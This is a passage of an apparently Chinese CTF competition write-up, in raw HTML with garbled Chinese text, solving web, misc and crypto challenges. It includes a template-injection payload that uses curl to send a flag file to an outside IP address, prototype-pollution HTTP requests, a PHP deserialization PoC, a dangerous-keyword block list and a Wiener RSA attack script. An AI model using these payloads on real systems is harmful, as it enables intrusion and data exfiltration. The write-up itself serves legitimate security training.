class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦ã€&#x27;</span>.$val.<span class="string">&#x27;ã€‘&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[a-z]$/i&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"> $content </span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $out_html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">&#x27;=&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">&#x27;&#x27;</span> || $arr[<span class="number">1</span>]==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£ã€&#x27;</span>.$ifstr.<span class="string">&#x27;ã€‘&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;!=&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/\&#123;|&#125;/&#x27;</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£&#x27;</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> . $ifstr . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">&#x27;if&#x27;</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">&#x27;/\&#123;if([0-9]):/&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;if&#x27;</span> . $matches3[ <span class="number">1</span> ], <span class="string">&#x27;&#123;if&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;else&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;end if&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;end if&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span>(<span class="params"> $s, $str=<span class="string">&#x27;,&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">&#x27;&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æ”¹è‡ªzzzphp rceï¼Œå‚è€ƒæ–‡ç« ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;y4er.com&#x2F;post&#x2F;zzzphp-rce&#x2F;</span><br></pre></td></tr></table></figure><p>å‘ç°è¿‡æ»¤äº†strï¼Œå› æ­¤ä½œè€…çš„é‚£ç§æ–¹æ³•ç”¨ä¸äº†äº†ï¼Œç›´æ¥åå¼•å·å‘½ä»¤æ‰§è¡Œï¼Œç”¨curlå¤–å¸¦å‡ºflagï¼Œæ„é€ payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)&#96;curl 47.97.210.141:9000&#x2F;\&#96;cat &#x2F;fl*\&#96;&#96;;&#x2F;&#x2F;&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯ç”¨ncç›‘å¬å³å¯å¾—åˆ°flag</p><h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h3><p>çœ‹äº†çœ‹ä¸»è¦ä»£ç ï¼Œå‘ç°å¾—åˆ°flagçš„æ¡ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line"><span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line"><span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">res.send(process.env.flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”keyå’Œpasswordæ˜¯å¯æ§çš„ï¼Œæ¥ç€å‘ç°setFnè¿™ä¸ªæ•æ„Ÿå‡½æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> key = req.body.NewAttributeKey.toString();</span><br><span class="line"><span class="keyword">let</span> value = req.body.NewAttributeValue.toString();</span><br><span class="line">setFn(req.session.knight, key, value);</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯å¼•å…¥set-valueè¿™ä¸ªåŒ…å¾—åˆ°çš„ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br></pre></td></tr></table></figure><p>æœäº†ä¸‹ï¼Œæœåˆ°äº†è¿™ç¯‡æ–‡ç« ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-JS-SETVALUE-450213</span><br></pre></td></tr></table></figure><p>jsåŸå‹é“¾æ±¡æŸ“ï¼Œä¸ºæ‰€æœ‰å¯¹è±¡å¢åŠ aaaå±æ€§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Privilege HTTP&#x2F;1.1</span><br><span class="line">Host: eci-2zefq4smu48613r6o17l.cloudeci1.ichunqiu.com:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: __jsluid_h&#x3D;93637ceba89c6fddd5299faa318a6cea; session&#x3D;s%3A7wfZ0-VLrHUCedTzvR8lbsdb9yZkkEZH.8uPhesdOIoUUYn73e63GfvympMqk%2FiBm3cJ6avzlyaY</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Thu, 20 Aug 2020 08:01:33 GMT</span><br><span class="line">If-None-Match: W&#x2F;&quot;1cb-1740ae32748&quot;</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 51</span><br><span class="line"></span><br><span class="line">NewAttributeKey&#x3D;__proto__.aaa&amp;NewAttributeValue&#x3D;aaa</span><br></pre></td></tr></table></figure><p>ç”¨æ±¡æŸ“çš„é”®å€¼å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;DeveloperControlPanel HTTP&#x2F;1.1</span><br><span class="line">Host: eci-2zefq4smu48613r6o17l.cloudeci1.ichunqiu.com:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: __jsluid_h&#x3D;93637ceba89c6fddd5299faa318a6cea; session&#x3D;s%3A7wfZ0-VLrHUCedTzvR8lbsdb9yZkkEZH.8uPhesdOIoUUYn73e63GfvympMqk%2FiBm3cJ6avzlyaY</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Thu, 20 Aug 2020 08:01:33 GMT</span><br><span class="line">If-None-Match: W&#x2F;&quot;1cb-1740ae32748&quot;</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 20</span><br><span class="line"></span><br><span class="line">key&#x3D;aaa&amp;password&#x3D;aaa</span><br></pre></td></tr></table></figure><h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ä½ å¤ªé•¿äº†&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨<code>NAN</code>å’Œ<code>INF</code>ç»•è¿‡ï¼Œå¦‚å›¾ï¼š</p><p><img src="/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/QQ%E6%88%AA%E5%9B%BE20200821134126.png"></p><p>æ„é€ pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">&#125; </span><br><span class="line">$a=<span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;trick1=<span class="string">&#x27;NAN&#x27;</span>;</span><br><span class="line">$a-&gt;trick2=NAN;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>ç­‰åˆ°å„ä¸ªåœ°åŒºåŠ©åŠ›å®Œæˆåå°±ä¼šç»™å‡ºflag</p><h3 id="the-best-ctf-game"><a href="#the-best-ctf-game" class="headerlink" title="the_best_ctf_game"></a>the_best_ctf_game</h3><p>hxdæ‰“å¼€å¯ä»¥æ˜æ˜¾çœ‹åˆ°flagå­—æ ·</p><img src="/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/QQæˆªå›¾20200821111411.png" style="zoom: 80%;"><p>å¹¶ä¸”ä¸­é—´éš”çš„éƒ½æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 0C 00 00 00 E0 FF FF FF B0 FF FF FF 00 00 00 00</span><br></pre></td></tr></table></figure><p>ç›´æ¥å…¨å±€æ›¿æ¢æˆç©ºå¾—åˆ°flag</p><p><img src="/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/QQ%E6%88%AA%E5%9B%BE20200821111629.png"></p><h3 id="ç”µè„‘è¢«é»‘"><a href="#ç”µè„‘è¢«é»‘" class="headerlink" title="ç”µè„‘è¢«é»‘"></a>ç”µè„‘è¢«é»‘</h3><p>binwalkåˆ†ç¦»å‡º</p><p><img src="/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/QQ%E6%88%AA%E5%9B%BE20200821151353.png"></p><p>demoç”¨ida64æ‰“å¼€å¾—åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+1Dh] [rbp-13h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+1Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  FILE *v7; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">34</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = fgetc(v7);</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        fputc(v4 ^ (v5 + v6), stream);</span><br><span class="line">        v4 += <span class="number">34</span>;</span><br><span class="line">        v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fclose(v7);</span><br><span class="line">      fclose(stream);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;cannot open file&quot;</span>, <span class="string">&quot;rb+&quot;</span>, argv);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cannot open this file&quot;</span>, <span class="string">&quot;rb&quot;</span>, argv);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æç¤ºè¯¯åˆ æ•°æ®ï¼Œç”¨extundeleteæ¢å¤åˆ é™¤çš„æ•°æ®å¾—åˆ°flag.txt</p><img src="/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/QQæˆªå›¾20200821155557.png" style="zoom:80%;"><p>é€†ä¸€ä¸‹ç®—æ³•ï¼Œexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v4=<span class="number">34</span></span><br><span class="line">v5=<span class="number">0</span></span><br><span class="line">v7=open(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> v6 <span class="keyword">in</span> v7:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;trueflag.txt&quot;</span>,<span class="string">&quot;ab+&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="comment"># print(str(v6))</span></span><br><span class="line">        a=((int(str(v6))^v4)-v5)%<span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span> a==<span class="number">-1</span>:</span><br><span class="line">            v4=<span class="number">34</span></span><br><span class="line">            v5=<span class="number">0</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print(chr(a),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    v4+=<span class="number">34</span>;</span><br><span class="line">    v5=(v5+<span class="number">2</span>) &amp; <span class="number">0xf</span></span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bd"><a href="#bd" class="headerlink" title="bd"></a>bd</h3><p>RSAä¸­çš„ç»´çº³æ”»å‡»ï¼Œè„šæœ¬åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;pablocelayes&#x2F;rsa-wiener-attack</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç»´çº³æ”»å‡»è®¡ç®—å‡ºdï¼Œç„¶åè§£å¯†å°±è¡Œï¼Œè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Finds d knowing (e,n)</span></span><br><span class="line"><span class="string">    applying the Wiener continued fraction attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d<span class="number">-1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d<span class="number">-1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=<span class="number">-1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">c=<span 